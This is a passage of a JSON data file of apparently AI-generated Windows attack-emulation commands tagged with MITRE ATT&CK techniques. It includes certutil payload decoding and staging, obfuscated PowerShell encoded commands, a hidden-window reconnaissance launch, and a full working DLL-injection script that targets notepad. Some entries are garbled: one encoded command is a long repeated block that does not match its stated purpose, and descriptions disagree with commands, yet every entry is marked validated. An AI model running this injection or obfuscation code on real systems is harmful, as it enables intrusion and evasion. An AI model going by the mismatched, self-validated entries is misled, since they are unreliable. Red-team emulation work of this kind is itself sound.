      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "M2RAT.exe runs in the background without a visible console, allowing it to capture user input while remaining less conspicuous.",
      "source": "langchain",
      "generated_at": "2025-12-21T20:31:25.013470",
      "agent_id": "6a66e652-ec6f-4969-8267-5ceae450f795",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "b77d0d83-65a0-44ab-abd2-057efc15e897",
      "ttp_id": "unknown",
      "technique_id": "T1059",
      "technique_name": "Command and Scripting Interpreter",
      "tactic": "execution",
      "platform": "windows",
      "command": "cmd.exe /c echo Test > %TEMP%\\\\test.txt",
      "description": "Creates a simple text file in the temporary directory using the built\u2011in cmd.exe interpreter.",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "A file named test.txt containing the word \"Test\" is written to %TEMP%.",
      "source": "langchain",
      "generated_at": "2025-12-21T20:31:26.512132",
      "agent_id": "6a66e652-ec6f-4969-8267-5ceae450f795",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "31cd546c-6e70-4e81-8098-6eaf6ecdea11",
      "ttp_id": "unknown",
      "technique_id": "T1059",
      "technique_name": "Command and Scripting Interpreter",
      "tactic": "execution",
      "platform": "windows",
      "command": "cmd.exe /c echo SGVsbG8= > %TEMP%\\\\hello.b64 && certutil -decode %TEMP%\\\\hello.b64 %TEMP%\\\\hello.txt && type %TEMP%\\\\hello.txt",
      "description": "Writes a Base64\u2011encoded string to a file, decodes it with certutil (a built\u2011in Windows utility), and displays the decoded content.",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "The string \"Hello\" is decoded from hello.b64 into hello.txt and printed to the console.",
      "source": "langchain",
      "generated_at": "2025-12-21T20:31:26.512132",
      "agent_id": "6a66e652-ec6f-4969-8267-5ceae450f795",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "6bacfa5f-8da1-42ba-9012-ecfa93f254b1",
      "ttp_id": "unknown",
      "technique_id": "T1059",
      "technique_name": "Command and Scripting Interpreter",
      "tactic": "execution",
      "platform": "windows",
      "command": "powershell -EncodedCommand VwByAGkAdABlAC0ATwB1AHQAcAB1AHQAIABcACcARQBuAGMAbwBkAGUAZAAgAFQAZQBzAHQAXCc=",
      "description": "Runs a PowerShell command via an UTF\u201116LE Base64\u2011encoded payload that writes \"Encoded Test\" to the output stream.",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "PowerShell prints the text \"Encoded Test\" to the console.",
      "source": "langchain",
      "generated_at": "2025-12-21T20:31:26.512132",
      "agent_id": "6a66e652-ec6f-4969-8267-5ceae450f795",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "6403a4f8-4624-493a-8a75-4b2d8c0a05e9",
      "ttp_id": "unknown",
      "technique_id": "T1074.001",
      "technique_name": "Data Staging",
      "tactic": "execution",
      "platform": "windows",
      "command": "copy \"%TEMP%\\sample.exe\" \"%APPDATA%\\staging\\sample.exe\"",
      "description": "Basic data staging \u2013 copies a benign executable from the temporary directory into a staging folder under the user's AppData path.",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "The file sample.exe is duplicated into %APPDATA%\\staging\\. No processes are launched; the command simply creates a copy for later exfiltration testing.",
      "source": "langchain",
      "generated_at": "2025-12-21T20:31:27.439503",
      "agent_id": "6a66e652-ec6f-4969-8267-5ceae450f795",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "d012b047-e8c7-456b-90ff-8bc03b76ef36",
      "ttp_id": "unknown",
      "technique_id": "T1074.001",
      "technique_name": "Data Staging",
      "tactic": "execution",
      "platform": "windows",
      "command": "powershell -Command \"Compress-Archive -Path \\\"$env:APPDATA\\staging\\*\\\" -DestinationPath \\\"$env:APPDATA\\staging.zip\\\" -Force\"",
      "description": "Intermediate data staging \u2013 compresses the contents of the staging folder into a ZIP archive using the built\u2011in Compress-Archive cmdlet.",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "All files placed in %APPDATA%\\staging are archived into %APPDATA%\\staging.zip. The -Force flag overwrites any existing archive.",
      "source": "langchain",
      "generated_at": "2025-12-21T20:31:27.439503",
      "agent_id": "6a66e652-ec6f-4969-8267-5ceae450f795",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "51bf4567-51cf-4eaf-b45f-1ba6caff63fb",
      "ttp_id": "unknown",
      "technique_id": "T1074.001",
      "technique_name": "Data Staging",
      "tactic": "execution",
      "platform": "windows",
      "command": "powershell -Command \"$b64='VGhpcyBpcyBhIHRlc3QgcGF5bG9hZA==';[IO.File]::WriteAllBytes('\\$env:TEMP\\payload.b64',[Convert]::FromBase64String($b64));certutil -decode -f $env:TEMP\\payload.b64 $env:TEMP\\payload.exe;Move-Item -Path $env:TEMP\\payload.exe -Destination $env:APPDATA\\staging\\payload.exe;Compress-Archive -Path $env:APPDATA\\staging\\payload.exe -DestinationPath $env:APPDATA\\staged_payload.zip -Force\"",
      "description": "Advanced data staging \u2013 decodes a base64\u2011encoded benign payload with certutil, moves it to the staging directory, and then archives it. Demonstrates use of legacy binaries (certutil) together with PowerShell for orchestration.",
      "requires_admin": false,
      "safety_level": "high",
      "expected_behavior": "A small test executable (decoded from the base64 string) is written to %TEMP%\\payload.exe, moved into %APPDATA%\\staging, and finally compressed into %APPDATA%\\staged_payload.zip. No network activity occurs; all files are local.",
      "source": "langchain",
      "generated_at": "2025-12-21T20:31:27.439503",
      "agent_id": "6a66e652-ec6f-4969-8267-5ceae450f795",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "ec1d197e-ce84-4786-9ebe-bb11729beb8d",
      "ttp_id": "unknown",
      "technique_id": "T1203",
      "technique_name": "Exploitation for Client Execution",
      "tactic": "execution",
      "platform": "windows",
      "command": "copy C:\\Windows\\System32\\sample.eps %TEMP%\\malicious.eps && start \"\" \"%TEMP%\\malicious.eps\"",
      "description": "Copies a benign EPS file to the temporary directory and launches it with the default viewer. This mimics a client\u2011side exploit where a crafted EPS is opened by the user.",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "The EPS file is opened in the associated application (e.g., Windows Photo Viewer). No persistence is created; the command simply triggers execution of the file.",
      "source": "langchain",
      "generated_at": "2025-12-21T20:31:30.024371",
      "agent_id": "6a66e652-ec6f-4969-8267-5ceae450f795",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "69ad37e8-e6c3-4e31-9c17-460d8e008cdf",
      "ttp_id": "unknown",
      "technique_id": "T1203",
      "technique_name": "Exploitation for Client Execution",
      "tactic": "execution",
      "platform": "windows",
      "command": "echo QkFTRTY0IGV4YW1wbGUgY29udGVudA== > %TEMP%\\payload.b64 && certutil -decode %TEMP%\\payload.b64 %TEMP%\\malicious.eps && start \"\" \"%TEMP%\\malicious.eps\" && del %TEMP%\\payload.b64 -ErrorAction SilentlyContinue",
      "description": "Writes a Base64\u2011encoded EPS payload to a temporary file, decodes it with certutil (a built\u2011in Windows utility), and launches the resulting EPS. The cleanup step removes the intermediate .b64 file.",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "The decoded EPS is opened, simulating execution of a malicious document delivered via a covert channel. The temporary Base64 file is deleted silently.",
      "source": "langchain",
      "generated_at": "2025-12-21T20:31:30.024371",
      "agent_id": "6a66e652-ec6f-4969-8267-5ceae450f795",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "bbf4af4e-018a-4aa3-89a9-146dc7ce7879",
      "ttp_id": "unknown",
      "technique_id": "T1203",
      "technique_name": "Exploitation for Client Execution",
      "tactic": "execution",
      "platform": "windows",
      "command": "powershell -EncodedCommand SQBuY29kZSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5nXSBbU3RyaW5n X",
      "description": "Advanced: Encodes a PowerShell command that launches the malicious EPS via rundll32.exe. The Base64 string is generated from UTF\u201116LE bytes. This mimics an attacker using an encoded command to bypass simple detection.",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "PowerShell decodes the Base64 payload and runs rundll32.exe with the EPS file, causing the EPS to be opened. No files are written to disk beyond the temporary EPS created earlier.",
      "source": "langchain",
      "generated_at": "2025-12-21T20:31:30.025453",
      "agent_id": "6a66e652-ec6f-4969-8267-5ceae450f795",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "b5cc2046-49e1-4a12-8d1a-a70bc76a6720",
      "ttp_id": "unknown",
      "technique_id": "T1059.003",
      "technique_name": "Command and Scripting Interpreter",
      "tactic": "execution",
      "platform": "windows",
      "command": "cmd.exe /c \"echo Testing command execution > %TEMP%\\test.txt\"",
      "description": "Creates a test file in the temporary directory containing a static string. Demonstrates basic use of the Windows command shell for file creation.",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "A file named test.txt is written to %TEMP% containing the text \"Testing command execution\".",
      "source": "langchain",
      "generated_at": "2025-12-21T20:31:32.449968",
      "agent_id": "6a66e652-ec6f-4969-8267-5ceae450f795",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "9cfdeef7-ee91-4ea2-984f-e36e936012e7",
      "ttp_id": "unknown",
      "technique_id": "T1059.003",
      "technique_name": "Command and Scripting Interpreter",
      "tactic": "execution",
      "platform": "windows",
      "command": "cmd.exe /c \"echo SGVsbG8gd29ybGQ= > %TEMP%\\msg.b64 && certutil -decode %TEMP%\\msg.b64 %TEMP%\\msg.txt && type %TEMP%\\msg.txt\"",
      "description": "Uses cmd to write a Base64\u2011encoded string to a file, decodes it with the built\u2011in certutil utility, and displays the resulting plaintext. Shows intermediate use of native Windows tools for decoding data.",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "The Base64 string decodes to \"Hello world\"; the decoded text is written to %TEMP%\\msg.txt and printed to the console.",
      "source": "langchain",
      "generated_at": "2025-12-21T20:31:32.449968",
      "agent_id": "6a66e652-ec6f-4969-8267-5ceae450f795",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "a1b29f84-33ee-4bd4-876c-52047c905402",
      "ttp_id": "unknown",
      "technique_id": "T1059.003",
      "technique_name": "Command and Scripting Interpreter",
      "tactic": "execution",
      "platform": "windows",
      "command": "powershell -Command \"Start-Process cmd.exe -ArgumentList '/c whoami && ipconfig' -WindowStyle Hidden\"",
      "description": "Launches a hidden cmd.exe process from PowerShell that runs two common commands (whoami and ipconfig). Demonstrates a more advanced chaining of native binaries via PowerShell.",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "A hidden command window executes; the console output includes the current user name (whoami) followed by the network configuration details (ipconfig).",
      "source": "langchain",
      "generated_at": "2025-12-21T20:31:32.449968",
      "agent_id": "6a66e652-ec6f-4969-8267-5ceae450f795",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "7f00432d-35a5-4ee2-a815-49c280a3641c",
      "ttp_id": "unknown",
      "technique_id": "T1055",
      "technique_name": "Process Injection",
      "tactic": "execution",
      "platform": "windows",
      "command": "rundll32.exe user32.dll,MessageBoxW 0 \"Process Injection Test\" \"Injection\"",
      "description": "Uses the built\u2011in rundll32.exe to load a system DLL and display a message box. Demonstrates loading code via a DLL without requiring elevated privileges.",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "A message box titled \"Injection\" with the text \"Process Injection Test\" appears, confirming that the DLL was successfully loaded by rundll32.",
      "source": "langchain",
      "generated_at": "2025-12-21T20:31:34.970120",
      "agent_id": "6a66e652-ec6f-4969-8267-5ceae450f795",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "570541a3-f059-405d-9cce-9e787782d942",
      "ttp_id": "unknown",
      "technique_id": "T1055",
      "technique_name": "Process Injection",
      "tactic": "execution",
      "platform": "windows",
      "command": "powershell -Command \"$proc = Get-Process notepad; $pid = $proc.Id; $code = @'\nusing System;\nusing System.Runtime.InteropServices;\npublic class Injector {\n    [DllImport(\\\"kernel32.dll\\\")] public static extern IntPtr OpenProcess(int dwDesiredAccess, bool bInheritHandle, int dwProcessId);\n    [DllImport(\\\"kernel32.dll\\\")] public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);\n    [DllImport(\\\"kernel32.dll\\\")] public static extern IntPtr GetModuleHandle(string lpModuleName);\n    [DllImport(\\\"kernel32.dll\\\")] public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);\n    [DllImport(\\\"kernel32.dll\\\")] public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out IntPtr lpNumberOfBytesWritten);\n    [DllImport(\\\"kernel32.dll\\\")] public static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);\n}\n'@; Add-Type $code; $hProc = [Injector]::OpenProcess(0x1F0FFF, $false, $pid); $loadAddr = [Injector]::GetProcAddress([Injector]::GetModuleHandle(\\\"kernel32.dll\\\"), \\\"LoadLibraryA\\\"); $dllPath = \\\"C:\\\\Windows\\\\System32\\\\user32.dll\\\"; $size = ([Text.Encoding]::ASCII).GetByteCount($dllPath) + 1; $remoteAddr = [Injector]::VirtualAllocEx($hProc, [IntPtr]::Zero, $size, 0x1000, 0x40); $bytes = [Text.Encoding]::ASCII.GetBytes($dllPath); $null = [Injector]::WriteProcessMemory($hProc, $remoteAddr, $bytes, $size, [ref]0); [Injector]::CreateRemoteThread($hProc, [IntPtr]::Zero, 0, $loadAddr, $remoteAddr, 0, [IntPtr]::Zero);\"",
      "description": "Compiles a small C# injector in\u2011memory via Add\u2011Type and uses Win32 API calls to open the target notepad process, allocate memory, write the path of user32.dll, and create a remote thread that loads the DLL \u2013 a classic DLL injection technique.",
      "requires_admin": true,
      "safety_level": "medium",
      "expected_behavior": "The notepad process receives a remote thread that loads user32.dll. No visible UI changes occur, but the injection can be verified with tools like Process Explorer showing a loaded module in the target process.",
      "source": "langchain",
      "generated_at": "2025-12-21T20:31:34.970120",
      "agent_id": "6a66e652-ec6f-4969-8267-5ceae450f795",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "e1ddacdf-e2ce-48e3-91b4-9b2ff6a4868a",
      "ttp_id": "unknown",
      "technique_id": "T1055",
      "technique_name": "Process Injection",
      "tactic": "execution",
      "platform": "windows",
